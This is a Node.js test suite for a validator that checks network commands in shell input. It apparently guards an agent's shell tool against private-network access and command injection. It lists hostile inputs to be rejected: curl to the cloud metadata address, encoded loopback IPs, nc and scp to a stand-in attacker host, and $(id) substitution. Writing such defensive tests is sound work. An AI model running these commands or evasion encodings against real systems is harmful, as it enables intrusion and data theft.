import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { validateShellNetworkCommand } from "../../src/tools/shell-network-policy.js";

// Stub resolvers: the corpus must be rejected by static analysis, never by DNS.
const PUBLIC_RESOLVE = async () => ["93.184.216.34"];
const PRIVATE_RESOLVE = async () => ["10.9.9.9"];

describe("validateShellNetworkCommand", () => {
  it("allows commands without network clients", async () => {
    await validateShellNetworkCommand("echo hello && ls -la", [], PUBLIC_RESOLVE);
    await validateShellNetworkCommand("echo curl is a tool", [], PUBLIC_RESOLVE);
  });

  it("allows curl to a public URL", async () => {
    await validateShellNetworkCommand("curl https://example.com/article", [], PUBLIC_RESOLVE);
  });

  it("allows absolute-path clients to public destinations", async () => {
    await validateShellNetworkCommand("/usr/bin/curl https://example.com/article", [], PUBLIC_RESOLVE);
    await validateShellNetworkCommand("sudo /usr/bin/curl https://example.com/article", [], PUBLIC_RESOLVE);
  });

  it("blocks absolute-path clients to private destinations", async () => {
    await assert.rejects(
      validateShellNetworkCommand("/usr/bin/curl http://127.0.0.1/admin", [], PUBLIC_RESOLVE),
      /Private network/,
    );
    await assert.rejects(
      validateShellNetworkCommand("/usr/bin/ssh user@evil.test", [], PRIVATE_RESOLVE),
      /Private network/,
    );
    await assert.rejects(
      validateShellNetworkCommand("/bin/ping evil.test", [], PRIVATE_RESOLVE),
      /Private network/,
    );
    await assert.rejects(
      validateShellNetworkCommand("sudo /usr/bin/wget http://evil.test/x", [], PRIVATE_RESOLVE),
      /Private network/,
    );
    await assert.rejects(
      validateShellNetworkCommand("env FOO=1 /usr/bin/nc evil.test 80", [], PRIVATE_RESOLVE),
      /Private network/,
    );
  });

  it("handles Windows-style client paths and executable extensions", async () => {
    // A backslash path with an extension must still be recognized as a client —
    // otherwise validation is skipped entirely (bypass).
    await assert.rejects(
      validateShellNetworkCommand("C:\\Windows\\System32\\ssh.exe user@evil.test", [], PRIVATE_RESOLVE),
      /Private network/,
      "Windows-path ssh.exe must be destination-validated",
    );
    await assert.rejects(
      validateShellNetworkCommand("C:\\Tools\\nc.exe evil.test 80", [], PRIVATE_RESOLVE),
      /Private network/,
      "Windows-path nc.exe must be destination-validated",
    );
    await assert.rejects(
      validateShellNetworkCommand("C:\\Windows\\System32\\curl.exe http://127.0.0.1/admin", [], PUBLIC_RESOLVE),
      /Private network/,
    );
    // Legitimate Windows-path clients to public destinations are allowed.
    await validateShellNetworkCommand("C:\\Windows\\System32\\curl.exe https://example.com/article", [], PUBLIC_RESOLVE);
    await validateShellNetworkCommand("C:\\Windows\\System32\\ping.exe example.com", [], PUBLIC_RESOLVE);
  });

  it("blocks bare clients to private destinations", async () => {
    await assert.rejects(
      validateShellNetworkCommand("curl http://169.254.169.254/latest/meta-data/", [], PUBLIC_RESOLVE),
      /Private network/,
    );
    await assert.rejects(
      validateShellNetworkCommand("ssh user@10.0.0.1", [], PUBLIC_RESOLVE),
      /Private network/,
    );
    await assert.rejects(
      validateShellNetworkCommand("nc 192.168.1.1 80", [], PUBLIC_RESOLVE),
      /Private network/,
    );
    await assert.rejects(
      validateShellNetworkCommand("telnet evil.test 23", [], PRIVATE_RESOLVE),
      /Private network/,
    );
    await assert.rejects(
      validateShellNetworkCommand("scp file user@evil.test:/tmp/x", [], PRIVATE_RESOLVE),
      /Private network/,
    );
  });

  it("blocks obfuscated numeric IP encodings even when DNS looks innocent", async () => {
    // The stub claims every hostname is public — the block must come from
    // numeric-literal normalization, not DNS.
    for (const url of [
      "curl http://0x7f.0.0.1/",
      "curl http://0x7f000001/",
      "curl http://2130706433/",
      "curl http://0177.0.0.1/",
      "curl http://0xC0.0xA8.0x1.0x1/",
      "curl http://[::ffff:127.0.0.1]/",
      "/usr/bin/nc 0x7f.0.0.1 80",
    ]) {
      await assert.rejects(
        validateShellNetworkCommand(url, [], PUBLIC_RESOLVE),
        /Private network/,
        `should block: ${url}`,
      );
    }
  });

  it("rejects command substitution alongside network clients", async () => {
    await assert.rejects(
      validateShellNetworkCommand("curl https://example.com/$(id)", [], PUBLIC_RESOLVE),
      /command substitution/,
    );
    await assert.rejects(
      validateShellNetworkCommand("curl https://example.com/`id`", [], PUBLIC_RESOLVE),
      /command substitution/,
    );
    await assert.rejects(
      validateShellNetworkCommand("/usr/bin/curl $(echo https://example.com)", [], PUBLIC_RESOLVE),
      /command substitution|validated/,
    );
  });

  it("rejects network clients with no validatable destination", async () => {
    await assert.rejects(
      validateShellNetworkCommand("curl $URL", [], PUBLIC_RESOLVE),
      /could not be validated/,
    );
    await assert.rejects(
      validateShellNetworkCommand("ssh user@evil.test", [], async () => { throw new Error("getaddrinfo ENOTFOUND"); }),
      /ENOTFOUND/,
    );
  });

  it("rejects unresolvable destinations fail-closed", async () => {
    await assert.rejects(
      validateShellNetworkCommand("curl https://nonexistent.invalid/", [], async () => []),
      /Private network/,
    );
  });
});
